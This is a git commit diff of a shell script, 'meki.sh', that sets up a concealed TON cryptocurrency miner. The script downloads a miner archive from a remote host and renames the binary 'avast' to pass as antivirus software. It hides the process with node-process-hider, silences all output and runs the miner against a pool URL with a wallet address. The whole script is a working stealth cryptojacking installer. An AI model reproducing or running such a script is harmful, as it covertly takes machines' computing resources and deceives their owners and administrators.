d81c1f8bb8b8e2e578eae84d6649ee4ed48838d4
renilo <88342640+renilo@users.noreply.github.com>
2022-02-22 13:57:30 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -14,13 +14,13 @@ apt install screen -y
 
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider
 
-wget -q https://downloads.toncoin.plus/ubuntu/toncoin.plus-miner-1.7.4-ubuntu.tar.gz >/dev/null 2>&1 
+wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1 
 
-tar xf toncoin.plus-miner-1.7.4-ubuntu.tar.gz >/dev/null 2>&1
+tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz  >/dev/null 2>&1
 
-rm -f toncoin.plus-miner-1.7.4-ubuntu.tar.gz >/dev/null 2>&1
+mv danila-miner avast >/dev/null 2>&1
 
-mv toncoin_plus avast >/dev/null 2>&1
+rm -rvf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
 
 chmod +x avast >/dev/null 2>&1
 
@@ -32,4 +32,4 @@ chmod +x avast >/dev/null 2>&1
 
 sudo ph add avast
 
-./avast EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
+./avast run https://ton-pool-server-p3agi.ondigitalocean.app EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
